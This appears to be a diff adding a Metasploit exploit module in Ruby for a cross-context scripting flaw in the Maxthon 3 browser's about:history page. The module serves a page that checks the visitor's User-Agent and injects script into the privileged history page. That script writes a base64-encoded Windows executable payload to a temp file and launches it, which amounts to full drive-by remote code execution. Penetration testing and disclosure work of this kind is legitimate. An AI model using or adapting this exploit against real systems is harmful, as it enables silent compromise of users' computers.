@@ -1,0 +1,141 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+	include Msf::Exploit::EXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Maxthon3 about:history XCS Trusted Zone Code Execution',
+			'Description'    => %q{
+				Cross Context Scripting (XCS) is possible in the Maxthon about:history page.
+				Injection in such privileged/trusted browser zone can be used to modify
+				configuration settings and execute arbitrary commands.
+
+				Please note this module only works against specific versions of XCS. Currently,
+				we've only successfully tested on Maxthon 3.1.7 build 600 up to 3.2.2 build 1000.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'Roberto Suggi Liverani', # Discovered the vulnerability and developed msf module
+					'sinn3r', # msf module
+					'juan vazquez' # msf module
+				],
+			'References' =>
+				[
+					['URL', 'http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html']
+				],
+			'Payload' =>
+				{
+					'DisableNops' => true
+				},
+			'Platform'       => 'win',
+			'Targets' =>
+				[
+					['Maxthon 3 (prior to 3.3) on Windows', {} ]
+				],
+			'DisclosureDate' => 'Nov 26 2012',
+			'DefaultTarget'  => 0
+		))
+	end
+
+	def on_request_uri(cli, request)
+		if request.headers['User-agent'] !~ /Maxthon\/3/ or request.headers['User-agent'] !~ /AppleWebKit\/534.12/
+			print_status("Sending 404 for User-Agent #{request.headers['User-agent']}")
+			send_not_found(cli)
+			return
+		end
+
+		html_hdr = %Q|
+		<html>
+		<head>
+		<title>Loading</title>
+		|
+
+		html_ftr = %Q|
+		</head>
+		<body >
+		<h1>Loading</h1>
+		</body></html>
+		|
+
+		case request.uri
+			when /\?jspayload/
+				p = regenerate_payload(cli)
+				if (p.nil?)
+					send_not_found(cli)
+					return
+				end
+				# We're going to run this through unescape(), so make sure
+				# everything is encoded
+				penc = generate_payload_exe
+				penc2 = Rex::Text.encode_base64(penc)
+
+				# now this is base64 encoded payload which needs to be passed to the file write api in maxthon.
+				# Then file can be launched via Program DOM API, because of this only Maxthon 3.1 versions are targeted.
+				# The Program DOM API isn't available on Maxthon 3.2 and upper versions.
+				content = %Q|
+				if(maxthon.program)
+				{
+				var fileTemp = new maxthon.io.File.createTempFile("test","exe");
+				var fileObj = maxthon.io.File(fileTemp);
+				maxthon.io.FileWriter(fileTemp);
+				maxthon.io.writeDataURL("data:application/x-msdownload;base64,#{penc2}");
+				maxthon.program.Program.launch(fileTemp.name_,"C:");
+				}
+				|
+
+			when /\?history/
+				js = %Q|
+				window.onload = function() {
+					location.href = "about:history";
+				}
+				|
+
+				content = %Q|
+				#{html_hdr}
+				<script>
+				#{js}
+				</script>
+				#{html_ftr}
+				|
+
+			when get_resource()
+				print_status("Sending #{self.name} payload for request #{request.uri}")
+
+				js = %Q|
+				url = location.href;
+				url2 = url + "?jspayload=1";
+				inj = "?history#%22/><img src=a onerror=%22"
+				inj_1 = "a=document.createElement('script');a.setAttribute('src','"+url2+"');document.body.appendChild(a);";
+				window.location = unescape(inj) + inj_1;
+				|
+
+				content = %Q|
+				#{html_hdr}
+				<script>
+				#{js}
+				</script>
+				#{html_ftr}
+				|
+			else
+				print_status("Sending 404 for request #{request.uri}")
+				send_not_found(cli)
+				return
+		end
+
+		send_response_html(cli, content)
+	end
+
+end
